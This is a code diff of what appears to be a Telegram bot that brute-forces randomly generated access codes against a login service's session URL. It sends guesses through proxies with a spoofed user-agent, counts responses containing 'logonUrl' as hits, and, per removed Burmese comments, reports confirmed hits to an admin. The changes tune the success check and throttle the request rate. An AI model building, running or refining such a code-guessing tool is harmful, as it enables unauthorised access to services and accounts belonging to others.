@@ -54,8 +54,7 @@ async def verify_hit(session_url, code):
             headers = {"content-type": "application/json", "user-agent": "Mozilla/5.0"}
             async with ts.post(post_url, json=data, headers=headers, proxy=proxy) as p_req:
                 resp_text = await p_req.text()
-                # Success Response အပြည့်အစုံ စစ်ဆေးရန်
-                if any(k in resp_text.lower() for k in ['logonurl', 'success', 'code":0', 'redirect']):
+                if 'logonUrl' in resp_text:
                     return True
         except Exception:
             pass
@@ -88,9 +87,7 @@ async def perform_check(session_url, code, chat_id, semaphore):
                 headers = {"content-type": "application/json", "user-agent": "Mozilla/5.0"}
                 async with ts.post(post_url, json=data, headers=headers, proxy=proxy) as p_req:
                     resp_text = await p_req.text()
-                    
-                    # တွေ့ရှိပါက အတည်ပြုပြီး Admin ထံသို့ ပို့မည်
-                    if any(k in resp_text.lower() for k in ['logonurl', 'success', 'code":0', 'redirect']):
+                    if 'logonUrl' in resp_text:
                         is_valid = await verify_hit(session_url, code)
                         if not is_valid: return False
 
@@ -231,11 +228,11 @@ async def run_scan_loop(mode, chat_id, session_url, msg_id):
     scanned_count = 0
     found_count = 0
     start_time = time.time()
-    semaphore = asyncio.Semaphore(100)
+    semaphore = asyncio.Semaphore(50)
     
     while active_scans.get(chat_id, False):
         batch_tasks = []
-        for _ in range(50):
+        for _ in range(25):
             code = "".join(random.choices(chars, k=length))
             batch_tasks.append(perform_check(session_url, code, chat_id, semaphore))
         
@@ -259,7 +256,7 @@ async def run_scan_loop(mode, chat_id, session_url, msg_id):
         except Exception:
             pass
         
-        await asyncio.sleep(0.01)
+        await asyncio.sleep(0.05)
 
 @bot.message_handler(commands=['key'])
 async def handle_key(m):
